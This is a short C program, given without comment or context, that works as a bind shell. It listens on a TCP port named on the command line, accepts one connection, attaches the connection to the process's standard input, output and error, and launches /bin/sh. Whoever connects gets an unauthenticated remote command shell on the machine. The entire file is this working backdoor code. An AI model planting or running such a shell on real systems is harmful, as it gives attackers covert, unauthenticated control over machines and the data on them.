#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


#define ERROR	-1


main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sock;
	int new;
	int sockaddr_len = sizeof(struct sockaddr_in);
	char *arguments[] = { "/bin/sh", 0 };
	
	
	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == ERROR)
	{
		perror("server socket: ");
		exit(-1);
	}
		
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(argv[1]));
	server.sin_addr.s_addr = INADDR_ANY;
	bzero(&server.sin_zero, 8);
			
	if((bind(sock, (struct sockaddr *)&server, sockaddr_len)) == ERROR)
	{
		perror("bind : ");
		exit(-1);
	}
	
	if((listen(sock, 2)) == ERROR)
	{
		perror("listen");
		exit(-1);
	}
	
	if((new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)) == ERROR)
	{
		perror("accept");
		exit(-1);
	}
	
	close(sock);
	
	dup2(new, 0);
	dup2(new, 1);
	dup2(new, 2);

	execve(arguments[0], &arguments[0], NULL);
		
}

	
